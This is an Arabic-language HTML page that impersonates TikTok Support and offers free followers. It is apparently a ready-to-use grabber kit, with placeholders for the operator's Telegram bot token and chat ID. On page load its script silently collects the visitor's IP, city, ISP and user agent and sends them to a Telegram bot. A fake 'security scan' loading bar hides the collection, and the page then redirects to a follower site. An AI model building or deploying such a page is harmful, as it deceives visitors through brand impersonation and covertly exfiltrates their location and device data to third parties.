<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Support - نظام التحقق</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        #console { width: 90%; max-width: 600px; padding: 25px; border: 2px solid #0f0; box-shadow: 0 0 30px #0f0; background: rgba(0, 15, 0, 0.95); border-radius: 12px; text-align: center; }
        .loading-bar-container { width: 100%; height: 12px; background: #020; border: 1px solid #0f0; margin-top: 20px; border-radius: 10px; overflow: hidden; }
        .loading-bar { width: 0%; height: 100%; background: #0f0; transition: width 0.3s; }
        .warning { color: #ff0000; font-weight: bold; animation: blink 1s infinite; margin-bottom: 15px; }
        .info-text { font-size: 15px; color: #00ff00; line-height: 1.8; text-align: right; margin-bottom: 10px; }
        .btn-ready { background: #0f0; color: #000; padding: 12px 25px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 20px; display: none; box-shadow: 0 0 15px #0f0; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
    </style>
</head>
<body>

<div id="console">
    <p class="warning">⚠️ نظام الفحص الأمني نشط...</p>
    <div class="info-text" id="details">جاري استخراج بيانات الجهاز...</div>
    <div class="loading-bar-container">
        <div class="loading-bar" id="bar"></div>
    </div>
    <p id="status" style="margin-top: 15px;">يتم الآن الاتصال بخادم TikTok الرئيسي...</p>
    <button id="redirectBtn" class="btn-ready" onclick="goToTarget()">✅ استلام المتابعين الآن</button>
</div>

<script>
    // --- إعداداتك الخاصة (عدلها هنا) ---
    const botToken = 'رقم_التوكن_هنا'; 
    const chatId = 'رقم_الآيدي_هنا';
    const targetSite = "https://tikfollowers.com/tiktok-free-fans"; 
    // ----------------------------------

    async function startProcess() {
        try {
            // سحب البيانات عن طريق الـ IP فقط (لا يطلب إذن الموقع)
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            
            // عرض المعلومات للتمويه
            document.getElementById('details').innerHTML = `
                [✔] الجهاز المكتشف: ${navigator.platform} <br>
                [✔] المدينة التقريبية: ${data.city} <br>
                [✔] عنوان الـ IP: ${data.ip} <br>
                [✔] شركة الاتصال: ${data.org} <br>
                [✔] حالة النظام: متصل
            `;

            // إرسال البيانات للتليجرام
            const message = `
🎯 صيدة جديدة (نظام RALLO المطور)
📍 المدينة: ${data.city}
🌐 الشركة: ${data.org}
🔢 الـ IP: ${data.ip}
📱 الجهاز: ${navigator.userAgent}
⚠️ تم سحب البيانات بدون طلب إذن الموقع.
            `;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat-id=${chatId}&text=${encodeURIComponent(message)}`);

            // تشغيل الـ Loading Bar
            let width = 0;
            const bar = document.getElementById('bar');
            const status = document.getElementById('status');
            const btn = document.getElementById('redirectBtn');
            
            const interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                    status.innerHTML = "✅ تم التحقق بنجاح!";
                    status.style.color = "#fff";
                    btn.style.display = "inline-block"; 
                } else {
                    width += 2;
                    bar.style.width = width + "%";
                }
            }, 100);

        } catch (error) {
            document.getElementById('status').innerText = "فشل الاتصال بالسيرفر.. أعد المحاولة";
        }
    }

    function goToTarget() {
        window.location.href = targetSite;
    }

    startProcess();
</script>

</body>
</html>
